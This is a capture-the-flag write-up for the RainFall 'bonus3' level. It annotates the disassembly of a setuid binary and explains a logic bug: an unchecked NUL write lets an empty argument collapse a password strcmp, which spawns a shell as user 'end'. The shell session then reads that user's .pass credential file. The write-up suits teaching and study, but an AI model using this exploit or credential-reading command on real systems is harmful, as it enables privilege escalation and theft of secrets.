# Final step to validate project

## Core (3 lines)
- Program opens `/home/user/end/.pass`, reads it into `buf`, then `strcmp(buf, argv[1])` → success runs `execl("/bin/sh","sh",NULL)`.
- The vuln is `buf[atoi(argv[1])] = '\0'` — an **unchecked, user-controlled truncation** of `buf`.
- Instead of guessing the password, make **both sides empty**: `atoi("")=0` zeroes `buf[0]`, and `argv[1]=""`, so `strcmp("","")=0` passes.

## Decisive disass
```
<+31>  call fopen@plt        ; fopen("/home/user/end/.pass","r")  ; 0x80486f2=path, 0x80486f0="r"
<+63>  cmpl $0x0,0x9c(%esp)   ; fopen ret == NULL? (die path)
<+71>  je   <main+79>
<+73>  cmpl $0x2,0x8(%ebp)    ; argc == 2 ? (0x8(%ebp) is argc, not ebp)
<+77>  je   <main+89>
<+123> call fread@plt        ; fread#1: buf(0x18(%esp)), size 1, 0x42=66 bytes → buf[0x00..0x41]
<+128> movb $0x0,0x59(%esp)   ; NUL at 0x59=0x18+0x41 → bounds first chunk end at buf[0x41]
<+133> mov 0xc(%ebp),%eax ; +4 ; atoi(argv[1])   ; 0xc(%ebp)=argv, +4=argv[1]
<+149> movb $0x0,0x18(%esp,%eax,1) ; buf[atoi(argv[1])] = '\0'  ← vulnerability (no bounds check)
<+191> call fread@plt        ; fread#2: buf+0x42 (lea 0x42(%eax)), 0x41=65 bytes → buf[0x42..0x82]
<+206> call fclose@plt
<+230> call strcmp@plt        ; strcmp(buf, argv[1])
<+237> jne  <main+269>
<+262> call execl@plt         ; execl("/bin/sh","sh",NULL)  ; 0x804870a="/bin/sh", 0x8048707="sh"
<+279> call puts@plt          ; failure path: puts(buf+0x42)
```
(Prologue `push`/`and $0xfffffff0,%esp`/`rep stos` buffer-zeroing: confirm with `disas`. Skipped — standard frame setup.)

## Mechanism (why it works)
1. **argc gate**: `<+73>` compares `0x8(%ebp)` (which is `argc`, **not** `ebp` itself) against `$0x2`. So exactly one command-line argument is required (`argc == 2`). `ltrace` can't observe this branch: `/home/user/end/.pass` isn't readable as `bonus3`, so `fopen` returns `0` and the program dies at the `fopen` check (`<+71>`) before reaching the `argc` compare. We confirm `argc == 2` statically from `cmpl $0x2,0x8(%ebp)` plus the `argv[1]` access at `<+133>`.
2. **Two non-overlapping reads**: `fread#1` fills `buf[0x00..0x41]` (66 bytes), `fread#2` fills `buf[0x42..0x82]` (65 bytes). Only chunk #1 is used in `strcmp`; chunk #2 is only printed by `puts` on failure (`puts(buf+0x42)`).
3. **The truncation**: `<+149>` `movb $0x0,0x18(%esp,%eax,1)` writes a NUL into `buf[atoi(argv[1])]` with no bounds check. The attacker fully controls where the string ends.
4. **strcmp**: `0xc(%ebp)` is `argv` (`ebp` is the frame base pointer; `argv` lives at offset `+0xc`), `+4` is `argv[1]`, dereferenced as `strcmp`'s 2nd arg; `buf` is the 1st. Equal → `execl`; else → `puts` path.

## Exploit

### Winning condition
`strcmp(buf, argv[1]) == 0`. Guessing the real `.pass` content is infeasible, so make **both sides the empty string**:
```
atoi("") = 0        → buf[0] = '\0'  → buf == ""     ; via the unchecked buf[atoi(argv[1])]='\0'
argv[1] == ""                                        ; already empty
strcmp("","") = 0   → branch taken   → execl("/bin/sh","sh",NULL)
```

### payload / delivery (1 argv)
```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
```

## Diff vs previous level (bonus2)
- **No memory corruption**: bonus0–bonus2 were overflow/overwrite families (return-address or local). bonus3 is a pure **logic bug** — an unchecked user-controlled NUL write that collapses both `strcmp` operands to `""`.
- **Not guessing the secret; neutralizing the comparison**: the trick is zeroing the compare on both sides, not matching the password.

## Unverified / caveats
- Resulting `.pass` is omitted (managed in .pass).
